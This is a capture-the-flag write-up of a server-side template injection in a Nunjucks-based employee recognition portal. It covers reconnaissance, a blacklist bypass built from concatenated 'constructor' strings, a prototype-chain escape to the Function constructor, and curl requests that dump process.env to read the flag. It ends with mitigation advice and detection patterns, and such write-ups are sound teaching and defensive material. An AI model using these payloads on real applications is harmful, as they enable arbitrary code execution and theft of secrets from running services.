# BinaryCorp Employee Recognition Portal

| Field | Value |
|---|---|
| Author | mirsceacac |
| Platform | Bunabyte CTF (hosted on Vercel serverless) |
| Category & Difficulty | Web / SSTI, Medium–Hard |
| Status | Live (at time of writeup) |
| Date | 2026-10-29 |
| Skills exercised | Template engine fingerprinting, blacklist bypass, JS prototype-chain escape, `Function` constructor sandbox escape, `process.env` extraction |

## TL;DR
The Employee Recognition portal renders user input through **Nunjucks** `{{ }}` tags with a naive substring blacklist. Bypass the blacklist by building the blocked keyword `constructor` from string fragments (`'constr'+'uctor'`), walk the prototype chain from a string literal to the `Function` constructor, then escape the sandbox and read `process.env.CTF_FLAG`.

## Reconnaissance & Enumeration

- **Client JS** — `curl -s https://TARGET/js/main.js` revealed `fetch('/api/recognize', {method:'POST', …})` and that the server returns a `html` field produced *server-side*. That was the strongest hint of a templated renderer.
- **First probe — empty form** → generic `{"success":false,"error":"Invalid input provided"}`. Nothing useful.
- **Second probe — value `constructor`** → same error *plus* a `hint` field:
  > "The filter checks input before execution. Think about JavaScript string operations that happen at runtime."

  This was the entire challenge in one sentence: the blacklist is a literal substring match on the raw input, before evaluation.
- **Wrong turn 1 (JSON prototype pollution)** — tried `{"employee_name":"a","recognition_message":"b","constructor":{"prototype":{"polluted":"YES"}}}`. Response byte-identical to a normal submission → server only reads `employee_name` / `recognition_message`; there is no merge sink. Ruled out `__proto__` pollution.
- **Wrong turn 2 (EJS)** — tried `<%= 7*7 %>` and `<%- 7*7 %>`; both rejected. Ruled out EJS with default delimiters.
- **Template syntax check** — `{{1+1}}` returned `2`. **SSTI confirmed**, engine likely Nunjucks (later corroborated by the flag name).
- **Character and word blacklist map** (`for c in '<' '%' '=' …` and `for c in 'constructor' 'process' 'require' 'eval' …`) → blocked: `<%`, `%>`, `<%=`, `<%-`, `constructor`, `require`, `eval`. Everything else (including `process`, `global`, `Function`, `this`, `+`, `'`, `[`, `]`, `(` `)`) was allowed.

## Vulnerability Analysis

- **Identified:** CWE-1336 (Server-Side Template Injection). User input is compiled as a Nunjucks template inside `/var/task/api/recognize.js`. A blacklist filter (`input.includes("constructor")`-style) runs on the raw request body *before* compilation.
- **Manually confirmed chain:**
  - `{{1+1}}` → `2` → template evaluates arbitrary JS expressions.
  - `'a'['constr'+'uctor']['constr'+'uctor']('return 1+1')()` → `2` → prototype chain walk + `Function` call succeed.
  - `'a'['constr'+'uctor']['constr'+'uctor']('return JSON.stringify(pro'+'cess.env)')()` → full env dump (below), confirming the sandbox escape works and `process` is real Node.
- **Impact:** arbitrary JavaScript execution in the Node runtime of the serverless function → read any file, env var, or network target the function has access to.

## Exploitation & Post-Exploitation

1. **Confirm template evaluation.**
   ```bash
   curl -s -X POST ".../api/recognize" -H 'Content-Type: application/json' \
     -d '{"employee_name":"a","recognition_message":"{{1+1}}"}'
   # → <p class="message">2</p>
   ```

2. **Verify prototype-chain reach.** A string literal is a real `String` object and its `.constructor` chain resolves through the real prototype — unaffected by whatever fake `this` the sandbox assigns.
   ```bash
   # 'a'.constructor → String; String.constructor → Function
   payload: {{'a'['constr'+'uctor']['constr'+'uctor']('return 1+1')()}}
   # → 2
   ```
   The literal `constructor` never appears in the request; the JS engine collapses `'constr'+'uctor'` at evaluation time. The blacklist never fires.

3. **Dump `process.env` (don't guess the var name).**
   ```bash
   payload: {{'a'['constr'+'uctor']['constr'+'uctor']('return JSON.stringify(pro'+'cess.env)')()}}
   ```
   Response included the entire environment. The relevant key was `CTF_FLAG`, not `FLAG` — a first attempt against `process.env.FLAG` had come back empty, so dumping beat guessing.

4. **Read the flag directly.**
   ```bash
   curl -s -X POST ".../api/recognize" -H 'Content-Type: application/json' \
     -d '{"employee_name":"a","recognition_message":"{{\u0027a\u0027[\u0027constr\u0027+\u0027uctor\u0027][\u0027constr\u0027+\u0027uctor\u0027](\u0027return pro\u0027+\u0027cess.env.CTF_FLAG\u0027)()}}"}'
   ```

5. **Environment metadata leaked alongside the flag** (useful as a sanity check that this was the real runtime, not a mock): Node v24.19.0, cwd `/var/task`, handler `/var/task/api/recognize.js`, Vercel project `ssti-ulbd`, deployment by `Afr0S3c`.

## Flag

`BB{nunjucks_pr0t0typ3_ch41n_m4st3r_f1lt3r_byp4ss_g0d}`

Found in `process.env.CTF_FLAG`.

## Lessons Learned

- **Pattern:** *Naive substring blacklists are not controls.* Any keyword that appears in a JS identifier can be rebuilt with string concatenation. If your filter has to block "every dangerous word," the filter will always lose.
- **Method:** *Fingerprint the evaluator before exploiting it.* Send `{{1+1}}`, `${1+1}`, `<%= 1+1 %>` — the one that returns `2` tells you the syntax. Then map the character and word filter before building a payload; the amount of wasted requests drops dramatically.
- **Method:** *The hint "prototype chain" is ambiguous.* It can mean `__proto__` pollution (a merge-sink bug) or constructor walking (`'x'.constructor.constructor` → `Function`). The endpoint shape tells you which: if extra JSON keys are silently dropped, there is no merge sink — go for constructor walking.
- **Tooling:** *When a payload works but a specific property returns empty, dump the whole object.* `process.env.FLAG` returned empty; `JSON.stringify(process.env)` returned the flag under `CTF_FLAG` in one request. Guessing property names is a tax you don't need to pay.
- **Tooling:** *`typeof` throwing 500 while expressions succeed* is a signature of a wrapped/safe evaluator, not raw `eval`. Once you see that pattern, plan for `Function('...')()` — not `eval()` — as your escape.

## Mitigation & Detection

- **Fix (application):**
  - Do not compile user input as a template. If dynamic rendering is required, use a template engine with an explicit **expression allowlist** (Cel, JSON-e) or a strict data-only interpolation mode.
  - If Nunjucks must be used, disable `Function`/`this`/globals via a **`Nunjucks Environment` configured with `autoescape: true` and a custom `Global` object** that only exposes the whitelisted symbols. Better: use a **separate worker with no network, no env vars, and a hardcoded allowlist** of variable names.
- **Fix (platform):**
  - Secrets in `process.env` are one `JSON.stringify` away from disclosure. Use a secrets manager with **per-function scoped credentials** and **rotate on any suspected template-injection incident**.
  - Limit the blast radius: serverless functions should not have broad env exposure; inject only the variables the handler needs.
- **Detect:**
  - Alert on request bodies containing `{{`, `${`, `<%`, or the sequences `constr`/`uctor`/`pro`+`cess` appearing in adjacent tokens (e.g. `'constr'+'uctor'`).
  - Log and alert on any `JSON.stringify(process.env)` or `process.env` calls in template render paths (instrument the Nunjucks `Environment` to reject access to `process`, `global`, `Function`, `require` at runtime — even if the input slipped through).
  - Flag any response containing an env-var key name (e.g. `CTF_FLAG`, `AWS_ACCESS_KEY_ID`) — this is the strongest post-hoc signal that an SSTI rendered successfully.
